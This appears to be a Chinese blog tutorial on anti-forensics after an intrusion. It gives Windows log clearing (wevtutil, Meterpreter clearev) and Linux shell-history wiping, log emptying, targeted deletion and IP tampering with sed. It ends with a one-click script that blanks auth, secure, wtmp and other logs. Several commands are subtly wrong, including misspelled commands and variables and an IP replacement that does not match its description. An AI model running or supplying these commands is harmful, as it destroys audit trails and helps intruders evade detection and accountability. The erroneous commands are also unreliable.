## 一、前言

在渗透完成之后，为了减少被发现和追溯的概率，攻击者有必要清除自己的攻击痕迹，本文分别对windows和linux上清理痕迹的方式做一个总结。

## 二、windows

有远程桌面权限时手动删除日志：  
开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志  
 **wevtutil：**

    
    
    wevtutil el             列出系统中所有日志名称
    wevtutil cl system      清理系统日志
    wevtutil cl application 清理应用程序日志
    wevtutil cl security    清理安全日志

 **meterperter自带清除日志功能：**

    
    
    clearev     清除windows中的应用程序日志、系统日志、安全日志

 **清除recent：**

    
    
    在文件资源管理器中点击“查看”->“选项”->在常规->隐私中点击”清除”按钮
    
    或直接打开C:\Users\Administrator\Recent并删除所有内容
    
    或在命令行中输入del /f /s /q “%userprofile%\Recent*.*

## 三、linux

 **清除命令历史记录**

    
    
    histroy -r          #删除当前会话历史记录
    history -c          #删除内存中的所有命令历史
    rm .bash_history   #删除历史文件中的内容
    HISTZISE=0          #通过设置历史命令条数来清除所有历史记录
    在隐蔽的位置执行命令
    使用vim打开文件执行命令
    
    :set history=0
    :!command

 **linux日志文件**

    
    
    /var/run/utmp 记录现在登入的用户
    /var/log/wtmp 记录用户所有的登入和登出
    /var/log/lastlog 记录每一个用户最后登入时间
    /var/log/btmp 记录错误的登入尝试
    /var/log/auth.log 需要身份确认的操作
    /var/log/secure 记录安全相关的日志信息
    /var/log/maillog 记录邮件相关的日志信息
    /var/log/message 记录系统启动后的信息和错误日志
    /var/log/cron 记录定时任务相关的日志信息
    /var/log/spooler 记录UUCP和news设备相关的日志信息
    /var/log/boot.log 记录守护进程启动和停止相关的日志消息

 **完全删除日志文件：**

    
    
    cat /dev/null > filename
    : > filename
    > filename
    echo "" > filename
    echo > filename

 **针对性删除日志文件：**

    
    
    删除当天日志
    sed  -i '/当天日期/'d  filename

 **篡改日志文件：**

    
    
    将所有172.16.13.1 ，ip替换为127.0.0.1
    sed -i 's/170.170.64.17/127.0.0.1/g'

 **一键清除脚本：**

    
    
    #!/usr/bin/bash
    echo > /var/log/syslog
    echo > /var/log/messages
    echo > /var/log/httpd/access_log
    echo > /var/log/httpd/error_log
    echo > /var/log/xferlog
    echo > /var/log/secure
    echo > /var/log/auth.log
    echo > /var/log/user.log
    echo > /var/log/wtmp
    echo > /var/log/lastlog
    echo > /var/log/btmp
    echo > /var/run/utmp
    rm ~/./bash_history
    history -c

**免责声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。禁止任何人转载到其他站点，禁止用于任何非法用途。如有任何人凭此做何非法事情，均于笔者无关，特此声明。**

